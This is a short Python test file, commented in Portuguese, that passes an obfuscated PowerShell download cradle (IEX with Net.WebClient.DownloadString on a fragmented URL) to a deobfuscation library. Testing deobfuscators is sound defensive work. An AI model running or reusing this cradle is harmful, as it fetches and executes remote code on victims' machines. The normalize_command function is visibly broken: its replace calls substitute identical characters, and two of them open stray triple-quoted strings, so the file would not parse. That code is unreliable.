import pyminusone
import os

def normalize_command(command):
    """Normaliza caracteres especiais SEM adicionar espaços"""
    command = command.replace(''', "'")
    command = command.replace(''', "'")
    command = command.replace('"', '"')
    command = command.replace('"', '"')
    command = command.replace('′', "'")
    command = command.replace('″', '"')
    return command

def test_webclient_download():
    """Testa payload com WebClient e DownloadString"""
    print("=== Teste 1: Payload com WebClient DownloadString ===")
    obfuscated = """powershell.exe ("{1}{0}" -f 'x','IE') (&("{3}{2}{1}{0}"-f'ct','-Obje','w','Ne') ("{0}{2}{1}"-f 'N','nt','et.WebClie')).("{2}{0}{1}{3}"-f'dSt','rin','Downloa','g').Invoke(('''tp://','9','','git','.ly/','ht'))"""
    print(f"Input: {obfuscated[:80]}")
    
    result = pyminusone.deobfuscate_powershell(obfuscated)
    print(f"Output: {result}")

    
    


    
if __name__ == "__main__":  
    test_webclient_download()
   